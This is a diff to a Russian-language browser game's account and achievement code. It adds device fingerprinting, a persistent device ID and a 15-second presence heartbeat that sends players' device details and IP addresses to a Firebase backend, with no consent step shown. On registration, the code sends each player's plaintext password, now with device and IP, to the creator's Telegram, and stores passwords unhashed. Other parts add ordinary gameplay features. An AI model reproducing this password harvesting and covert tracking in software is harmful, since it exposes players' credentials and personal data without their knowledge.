@@ -296,6 +296,198 @@ async function syncAccountsFromFirebase() {
 }
 window.syncAccountsFromFirebase = syncAccountsFromFirebase;
 
+// --- DEVICE DETECTION & REAL-TIME PRESENCE SYSTEM ---
+
+function getDeviceInfo() {
+    let ua = navigator.userAgent || '';
+    
+    // Persistent unique device ID stored in localStorage so this specific device/browser is identifiable
+    let deviceId = '';
+    try {
+        deviceId = localStorage.getItem('shelter_device_id');
+        if (!deviceId || !deviceId.startsWith('dev_')) {
+            deviceId = 'dev_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now().toString(36);
+            localStorage.setItem('shelter_device_id', deviceId);
+        }
+    } catch(e) {
+        deviceId = 'dev_' + Math.random().toString(36).substring(2, 9);
+    }
+
+    // 1. Detect OS
+    let os = 'Неизвестно';
+    if (/android/i.test(ua)) os = 'Android';
+    else if (/iphone/i.test(ua)) os = 'iOS (iPhone)';
+    else if (/ipad/i.test(ua)) os = 'iPadOS (iPad)';
+    else if (/windows nt 10/i.test(ua) || /windows nt 11/i.test(ua)) os = 'Windows 10/11';
+    else if (/windows/i.test(ua)) os = 'Windows';
+    else if (/macintosh|mac os x/i.test(ua)) os = 'macOS (Mac)';
+    else if (/linux/i.test(ua)) os = 'Linux';
+
+    // 2. Detect Device Type
+    let type = '💻 Компьютер';
+    let isMobile = /mobile|iphone|ipod|android.*mobile/i.test(ua);
+    let isTablet = /ipad|android(?!.*mobile)/i.test(ua) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 2 && /macintosh/i.test(ua));
+    if (isTablet) type = '📟 Планшет';
+    else if (isMobile) type = '📱 Смартфон';
+
+    // 3. Detect Browser
+    let browser = 'Браузер';
+    if (/telegram/i.test(ua)) browser = 'Telegram Webview';
+    else if (/edg\//i.test(ua)) browser = 'Edge';
+    else if (/yabrowser/i.test(ua)) browser = 'Яндекс Браузер';
+    else if (/chrome|crios/i.test(ua) && !/opr|opera/i.test(ua)) browser = 'Chrome';
+    else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = 'Safari';
+    else if (/firefox|fxios/i.test(ua)) browser = 'Firefox';
+    else if (/opera|opr/i.test(ua)) browser = 'Opera';
+
+    // 4. Screen resolution & DPR
+    let w = (window.screen && window.screen.width) ? window.screen.width : window.innerWidth;
+    let h = (window.screen && window.screen.height) ? window.screen.height : window.innerHeight;
+    let dpr = window.devicePixelRatio || 1;
+    let screen = `${w}x${h} (@${dpr}x)`;
+
+    // 5. Short readable title
+    let emoji = type.split(' ')[0];
+    let shortName = `${emoji} ${os} (${browser})`;
+
+    return {
+        deviceId,
+        os,
+        type,
+        browser,
+        screen,
+        shortName,
+        platform: navigator.platform || '',
+        language: navigator.language || 'ru',
+        maxTouchPoints: navigator.maxTouchPoints || 0
+    };
+}
+window.getDeviceInfo = getDeviceInfo;
+
+// Record device under account
+function recordDeviceForAccount(username) {
+    if (!username || username.toLowerCase() === 'гость') return;
+    let dev = getDeviceInfo();
+    let accs = loadAccounts();
+    let lowerKey = username.toLowerCase();
+    let userAcc = accs[lowerKey];
+    if (!userAcc) return;
+
+    userAcc.devices = userAcc.devices || {};
+    let existing = userAcc.devices[dev.deviceId] || {};
+    userAcc.devices[dev.deviceId] = {
+        deviceId: dev.deviceId,
+        shortName: dev.shortName,
+        type: dev.type,
+        os: dev.os,
+        browser: dev.browser,
+        screen: dev.screen,
+        firstSeen: existing.firstSeen || Date.now(),
+        lastSeen: Date.now(),
+        lastIp: currentNetworkIp || '',
+        lastNetId: currentNetworkId || ''
+    };
+    saveAccounts(accs);
+
+    if (Object.keys(userAcc.devices).length >= 2) {
+        unlockAchievement('gadget_collector', username);
+    }
+
+    // Sync to Firebase
+    try {
+        fetch(`${FIREBASE_URL}/accounts/${encodeURIComponent(lowerKey)}/devices/${encodeURIComponent(dev.deviceId)}.json`, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(userAcc.devices[dev.deviceId])
+        }).catch(()=>{});
+    } catch(e){}
+}
+window.recordDeviceForAccount = recordDeviceForAccount;
+
+// Presence Heartbeat (Real-time online tracking)
+let presenceHeartbeatInterval = null;
+
+function sendPresencePing() {
+    let dev = getDeviceInfo();
+    let curUser = getCurrentUser() || 'Гость';
+    let p2 = (typeof getP2User === 'function') ? getP2User() : null;
+
+    let gState = (typeof gameState !== 'undefined' ? gameState : 'MENU');
+    let act = 'В меню';
+    if (typeof isTutorial !== 'undefined' && isTutorial && gState === 'PLAYING') {
+        act = '🎓 В обучении';
+    } else if (gState === 'PLAYING') {
+        act = (typeof secretMode !== 'undefined' && secretMode) ? '🔥 В бою (Секретный)' : '⚔️ В бою';
+    } else if (gState === 'GAMEOVER') {
+        act = '☠️ Конец боя';
+    }
+
+    let payload = {
+        deviceId: dev.deviceId,
+        user: curUser,
+        p2User: (p2 && p2.toLowerCase() !== 'гость') ? p2 : null,
+        deviceType: dev.type,
+        os: dev.os,
+        browser: dev.browser,
+        screen: dev.screen,
+        shortName: dev.shortName,
+        ip: currentNetworkIp || 'local',
+        netId: currentNetworkId || 'net_local',
+        state: 'ONLINE',
+        activity: act,
+        lastPing: Date.now(),
+        gameState: gState
+    };
+
+    try {
+        fetch(`${FIREBASE_URL}/presence/${encodeURIComponent(dev.deviceId)}.json`, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(()=>{});
+    } catch(e){}
+
+    if (curUser && curUser.toLowerCase() !== 'гость') {
+        recordDeviceForAccount(curUser);
+    }
+    if (p2 && p2.toLowerCase() !== 'гость') {
+        recordDeviceForAccount(p2);
+    }
+}
+window.sendPresencePing = sendPresencePing;
+
+function startPresenceHeartbeat() {
+    if (presenceHeartbeatInterval) clearInterval(presenceHeartbeatInterval);
+    sendPresencePing();
+    presenceHeartbeatInterval = setInterval(sendPresencePing, 15000);
+
+    window.addEventListener('beforeunload', () => {
+        let dev = getDeviceInfo();
+        let payload = JSON.stringify({ state: 'OFFLINE', lastPing: Date.now() });
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(`${FIREBASE_URL}/presence/${encodeURIComponent(dev.deviceId)}.json`, payload);
+        }
+    });
+
+    document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'visible') {
+            sendPresencePing();
+        }
+    });
+}
+window.startPresenceHeartbeat = startPresenceHeartbeat;
+
+// Auto-start heartbeat immediately on page load
+if (typeof window !== 'undefined') {
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', () => {
+            startPresenceHeartbeat();
+        });
+    } else {
+        startPresenceHeartbeat();
+    }
+}
+
 async function registerUser(name, password) {
     let cleanName = (name || '').trim();
     if (!cleanName) {
@@ -327,10 +519,25 @@ async function registerUser(name, password) {
         }
     } catch(e) {}
 
+    let dev = getDeviceInfo();
     let newAcc = {
         name: cleanName,
         password: password,
         createdAt: Date.now(),
+        devices: {
+            [dev.deviceId]: {
+                deviceId: dev.deviceId,
+                shortName: dev.shortName,
+                type: dev.type,
+                os: dev.os,
+                browser: dev.browser,
+                screen: dev.screen,
+                firstSeen: Date.now(),
+                lastSeen: Date.now(),
+                lastIp: currentNetworkIp || '',
+                lastNetId: currentNetworkId || ''
+            }
+        },
         stats: {
             soloNormalWins: 0, soloNormalLosses: 0,
             soloSecretWins: 0, soloSecretLosses: 0,
@@ -352,14 +559,17 @@ async function registerUser(name, password) {
         }).catch(err => console.warn("Firebase save acc err:", err));
     } catch(e) {}
 
-    // Уведомление главному админу в Telegram
+    // Уведомление главному админу в Telegram с подробностями об устройстве
     sendTelegramNotification(
         `🎮 <b>Убежище: Новый игрок!</b>\n` +
         `👤 <b>Имя:</b> ${cleanName}\n` +
-        `🔑 <b>Пароль:</b> ${password}\n` +
+        `🔑 <b>Пароль:</b> <code>${password}</code>\n` +
+        `📱 <b>Устройство:</b> ${dev.shortName} (${dev.screen})\n` +
+        `🌐 <b>Сеть:</b> ${currentNetworkIp || 'Неизвестно'}\n` +
         `⏰ <i>${new Date().toLocaleTimeString()}</i>`
     );
 
+    sendPresencePing();
     return { success: true, user: newAcc };
 }
 
@@ -392,6 +602,8 @@ async function loginUser(name, password) {
         return { success: false, message: "Неверный пароль!" };
     }
     setCurrentUser(acc.name);
+    recordDeviceForAccount(acc.name);
+    sendPresencePing();
     return { success: true, user: acc };
 }
 
@@ -494,6 +706,11 @@ async function detectCurrentNetwork() {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(netPayload)
         }).catch(()=>{});
+
+        // Trigger presence ping now that external network IP is known
+        if (typeof sendPresencePing === 'function') {
+            sendPresencePing();
+        }
     } catch(e) {}
 
     // Record visit for current player
@@ -619,6 +836,19 @@ function flagCheatUsage(cheatName) {
 }
 window.flagCheatUsage = flagCheatUsage;
 
+// --- EASY BOSS MODE (Ослабление Босса) ---
+let easyBossMode = false;
+function toggleEasyBossMode() {
+    easyBossMode = !easyBossMode;
+    window.easyBossMode = easyBossMode;
+    if (typeof updateEasyBossButtonUI === 'function') {
+        updateEasyBossButtonUI();
+    }
+    return easyBossMode;
+}
+window.easyBossMode = easyBossMode;
+window.toggleEasyBossMode = toggleEasyBossMode;
+
 // --- ACHIEVEMENTS DEFINITIONS ---
 const ACHIEVEMENTS_DEF = [
     { id: 'fish_day', title: '👑 «РЫБНЫЙ ДЕНЬ» 🐟', desc: 'Сыграть в одной команде с Создателем игры (РЫБой)!', prestigious: true },
@@ -633,11 +863,149 @@ const ACHIEVEMENTS_DEF = [
     { id: 'iron_will', title: '«Железная воля» 🚫', desc: 'Победить Босса, ни разу не использовав исцеление' },
     { id: 'phantom_nightmare', title: '«Кошмар Фантома» 😈', desc: 'Победить в секретном [Режиме L] в одиночку' },
     { id: 'brother_for_brother', title: '«Брат за брата» 🫂', desc: 'Поднять напарника в коопе, когда у вас осталось всего 1 HP' },
-    { id: 'true_flame', title: '«Истинное пламя» 🔥', desc: 'Разблокировать секретного Огненного Героя (клавиша 4)' },
-    { id: 'whisper_of_void', title: '«Шёпот Бездны» 👁️', desc: 'Активировать секретный Режим [L] (клавиша L в меню)' },
     { id: 'king_of_hill', title: '«Царь горы» 🥇', desc: 'Занять 1-е место в глобальной таблице лидеров' },
-    { id: 'tutorial_grad', title: '«Выпускник Убежища» 🎓', desc: 'Пройти полное боевое обучение' }
+    { id: 'tutorial_grad', title: '«Выпускник Убежища» 🎓', desc: 'Пройти полное боевое обучение' },
+    { id: 'floor_hugger', title: '«Любитель пола» 🛌', desc: 'Упасть лицом в пол от первой же атаки Босса' },
+    { id: 'dash_into_danger', title: '«Слабоумие и отвага» 🚀', desc: 'Сделать рывок прямо навстречу летящему сюрикену Босса' },
+    { id: 'heal_spammer', title: '«Аптечный магнат» 🩹', desc: 'Потратить все заряды исцеления быстрее, чем за 15 секунд' },
+    { id: 'mercy_enjoyer', title: '«Пацифист на минималках» 🕊️', desc: 'Победить Босса с включенной кнопкой Ослабления (-0.5 урона)' },
+    { id: 'gadget_collector', title: '«Повелитель экранов» 📱💻', desc: 'Зайти в игру с 2 или более разных устройств под одним аккаунтом' },
+    // Секретные задания (скрыты до открытия):
+    { id: 'true_flame', title: '«Истинное пламя» 🔥', desc: 'Разблокировать секретного Огненного Героя (клавиша 4)', secret: true },
+    { id: 'whisper_of_void', title: '«Шёпот Бездны» 👁️', desc: 'Активировать секретный Режим [L] (клавиша L в меню)', secret: true }
 ];
+
+// --- REAL-TIME WORLD EVENTS & CREATOR INTERACTION ---
+let activeWorldMessage = null; // { text, sender, timer, maxTimer }
+let worldEventCrystals = [];   // [{ x, y, vy, timer }]
+let worldGravityMod = 1.0;
+let worldGravityTimer = 0;
+let worldMeteors = [];         // [{ x, y, vx, vy, size, color, timer }]
+let worldBossRageTimer = 0;
+let lastWorldEventTimestamp = Date.now();
+
+function startWorldEventPolling() {
+    setInterval(async () => {
+        try {
+            let res = await fetch(`${FIREBASE_URL}/worldEvent.json`);
+            let evt = await res.json();
+            if (!evt || !evt.timestamp || evt.timestamp <= lastWorldEventTimestamp) return;
+            lastWorldEventTimestamp = evt.timestamp;
+            triggerLocalWorldEvent(evt);
+        } catch(e){}
+    }, 2500);
+}
+
+function triggerLocalWorldEvent(evt) {
+    if (!evt || !evt.type) return;
+
+    if (evt.type === 'MESSAGE') {
+        activeWorldMessage = {
+            text: evt.text || 'Привет от Создателя!',
+            sender: evt.sender || 'РЫБа (Создатель)',
+            timer: 360,
+            maxTimer: 360
+        };
+        if (typeof playSound === 'function') playSound('parry');
+    } else if (evt.type === 'AIRDROP') {
+        activeWorldMessage = {
+            text: '🎁 СОЗДАТЕЛЬ СБРОСИЛ ПРИПАСЫ С НЕБА!',
+            sender: evt.sender || 'РЫБа',
+            timer: 240,
+            maxTimer: 240
+        };
+        for (let i = 0; i < 3; i++) {
+            worldEventCrystals.push({
+                x: 200 + Math.random() * (GAME_WIDTH - 400),
+                y: -40 - i * 35,
+                vy: 2 + Math.random() * 1.5,
+                healAmount: 2,
+                timer: 900
+            });
+        }
+        if (typeof playSound === 'function') playSound('heal');
+    } else if (evt.type === 'LOW_GRAVITY') {
+        worldGravityMod = 0.35;
+        worldGravityTimer = 900; // 15 seconds
+        activeWorldMessage = {
+            text: '🎈 ЛУННАЯ ГРАВИТАЦИЯ ОТ СОЗДАТЕЛЯ (15 СЕК)!',
+            sender: evt.sender || 'РЫБа',
+            timer: 240,
+            maxTimer: 240
+        };
+        if (typeof playSound === 'function') playSound('tp');
+    } else if (evt.type === 'METEOR') {
+        activeWorldMessage = {
+            text: '🌠 ЗВЕЗДНЫЙ ДОЖДЬ СОЗДАТЕЛЯ!',
+            sender: evt.sender || 'РЫБа',
+            timer: 240,
+            maxTimer: 240
+        };
+        for (let i = 0; i < 15; i++) {
+            setTimeout(() => {
+                worldMeteors.push({
+                    x: Math.random() * GAME_WIDTH,
+                    y: -20,
+                    vx: -2 + Math.random() * 4,
+                    vy: 5 + Math.random() * 5,
+                    size: 4 + Math.random() * 4,
+                    color: Math.random() > 0.5 ? '#ffd700' : '#00ffff',
+                    timer: 120
+                });
+            }, i * 180);
+        }
+    } else if (evt.type === 'BOSS_RAGE') {
+        worldBossRageTimer = 720; // 12 seconds
+        activeWorldMessage = {
+            text: '🔥 СОЗДАТЕЛЬ РАЗОЗЛИЛ БОССА! БЕРЕГИСЬ!',
+            sender: evt.sender || 'РЫБа',
+            timer: 240,
+            maxTimer: 240
+        };
+        if (typeof playSound === 'function') playSound('voidExplode');
+    }
+}
+window.triggerLocalWorldEvent = triggerLocalWorldEvent;
+
+// Auto-start world event polling
+if (typeof window !== 'undefined') {
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', () => {
+            startWorldEventPolling();
+        });
+    } else {
+        startWorldEventPolling();
+    }
+}
+
+// Send player reaction to Creator in Telegram
+async function sendPlayerReaction(reactionText) {
+    let curUser = getCurrentUser() || 'Игрок';
+    let dev = (typeof getDeviceInfo === 'function') ? getDeviceInfo() : { shortName: 'Устройство' };
+    
+    let payload = {
+        user: curUser,
+        text: reactionText,
+        device: dev.shortName,
+        timestamp: Date.now()
+    };
+    try {
+        fetch(`${FIREBASE_URL}/playerFeedback.json`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(()=>{});
+    } catch(e){}
+
+    return sendTelegramNotification(
+        `💌 <b>СООБЩЕНИЕ ИЗ ИГРЫ СОЗДАТЕЛЮ!</b>\n` +
+        `👤 <b>Игрок:</b> ${curUser}\n` +
+        `📱 <b>Гаджет:</b> ${dev.shortName}\n` +
+        `💬 <b>Слова:</b> «${reactionText}»\n` +
+        `⏰ <i>${new Date().toLocaleTimeString()}</i>`
+    );
+}
+window.sendPlayerReaction = sendPlayerReaction;
 
 function unlockAchievement(achId, targetUserName) {
     let userName = targetUserName || getCurrentUser();
@@ -741,6 +1109,8 @@ async function loginUserP2(name, password) {
     }
 
     setP2User(acc.name);
+    recordDeviceForAccount(acc.name);
+    sendPresencePing();
     return { success: true, user: acc };
 }
 window.loginUserP2 = loginUserP2;
@@ -777,10 +1147,25 @@ async function registerUserP2(name, password) {
         }
     } catch(e) {}
 
+    let dev = getDeviceInfo();
     let newAcc = {
         name: cleanName,
         password: password,
         createdAt: Date.now(),
+        devices: {
+            [dev.deviceId]: {
+                deviceId: dev.deviceId,
+                shortName: dev.shortName,
+                type: dev.type,
+                os: dev.os,
+                browser: dev.browser,
+                screen: dev.screen,
+                firstSeen: Date.now(),
+                lastSeen: Date.now(),
+                lastIp: currentNetworkIp || '',
+                lastNetId: currentNetworkId || ''
+            }
+        },
         stats: {
             soloNormalWins: 0, soloNormalLosses: 0,
             soloSecretWins: 0, soloSecretLosses: 0,
@@ -805,10 +1190,13 @@ async function registerUserP2(name, password) {
     sendTelegramNotification(
         `🎮 <b>Убежище: Новый Игрок 2!</b>\n` +
         `👤 <b>Имя:</b> ${cleanName}\n` +
-        `🔑 <b>Пароль:</b> ${password}\n` +
+        `🔑 <b>Пароль:</b> <code>${password}</code>\n` +
+        `📱 <b>Устройство:</b> ${dev.shortName} (${dev.screen})\n` +
+        `🌐 <b>Сеть:</b> ${currentNetworkIp || 'Неизвестно'}\n` +
         `⏰ <i>${new Date().toLocaleTimeString()}</i>`
     );
 
+    sendPresencePing();
     return { success: true, user: newAcc };
 }
 window.registerUserP2 = registerUserP2;
@@ -957,10 +1345,11 @@ function recordBattleResult(isVictory) {
             ? `👤 <b>Игрок:</b> ${curUserStr}\n`
             : `👥 <b>Команда:</b> ${curUserStr} и ${p2}\n`;
 
+        let easyBadge = window.easyBossMode ? ' [🌱 Ослабленный босс]' : '';
         sendTelegramNotification(
             `🏆 <b>ПОБЕДА НАД БОССОМ!</b>\n` +
             teamInfo +
-            `⚔️ <b>Режим:</b> ${modeStr}\n` +
+            `⚔️ <b>Режим:</b> ${modeStr}${easyBadge}\n` +
             `📊 <b>Побед у ${curUserStr}:</b> ${totalW}\n` +
             `⏰ <i>${new Date().toLocaleTimeString()}</i>`
         );
@@ -969,6 +1358,12 @@ function recordBattleResult(isVictory) {
         if (!cheatUsedInBattle) {
             let battleDuration = (Date.now() - (battleStartTime || Date.now())) / 1000;
             let curH = new Date().getHours();
+
+            // Ослабление босса (Пацифист на минималках)
+            if (window.easyBossMode) {
+                unlockAchievement('mercy_enjoyer', curUser);
+                if (numPlayers === 2 && p2 && p2.toLowerCase() !== 'гость') unlockAchievement('mercy_enjoyer', p2);
+            }
 
             // 1. Полуночный охотник (ночью)
             if (curH >= 0 && curH < 5) {
